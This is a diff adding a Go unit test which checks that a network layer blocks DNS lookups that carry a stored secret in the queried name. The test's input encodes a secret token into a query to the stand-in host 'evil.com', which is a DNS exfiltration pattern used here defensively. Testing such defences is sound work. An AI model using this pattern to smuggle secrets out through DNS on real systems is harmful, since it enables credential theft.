@@ -10,7 +10,22 @@ import (
 	"github.com/efuturetoday/nocturn/internal/capability"
 	"github.com/efuturetoday/nocturn/internal/gateway"
 	"github.com/efuturetoday/nocturn/internal/netcap"
+	"github.com/efuturetoday/nocturn/internal/secret"
 )
+
+// The egress gap is closed: a secret encoded into the queried NAME is blocked before
+// any lookup leaves the process (DNS is an exfiltration channel).
+func TestLookup_EgressBlocksSecretInName(t *testing.T) {
+	store := secret.NewStore()
+	store.Set("tok", []byte("supersecretvalue1234"))
+	n := &netcap.Net{
+		Guard:   &gateway.Guard{Policy: allowResolve(capability.Wildcard)},
+		Scanner: secret.NewScanner(store),
+	}
+	if _, err := n.Lookup(context.Background(), "supersecretvalue1234.evil.com", "A"); !errors.Is(err, secret.ErrLeaked) {
+		t.Fatalf("err = %v, want ErrLeaked (secret in the DNS query name)", err)
+	}
+}
 
 func allowResolve(hostGlob string) capability.Policy {
 	return capability.Policy{Rules: []capability.Rule{
